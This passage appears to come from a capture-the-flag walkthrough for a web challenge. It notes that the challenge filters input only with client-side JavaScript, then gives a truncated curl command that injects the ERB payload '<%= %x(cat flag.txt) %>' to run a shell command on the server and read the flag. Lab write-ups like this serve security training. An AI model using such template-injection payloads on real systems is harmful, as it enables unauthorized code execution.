input and evaluates it; the only input filter is client-side JavaScript, so ERB
code-execution tags run server-side.

   ```

     --data-urlencode "sentence=<%= %x(cat flag.txt) %>" \
     --data-urlencode "number=1"
   ```

   (If `flag.txt` isn't found, try `/flag.txt` or `/flag`.)

2. **Extract the flag** (`FLAG{...}`) from the rendered response and report it
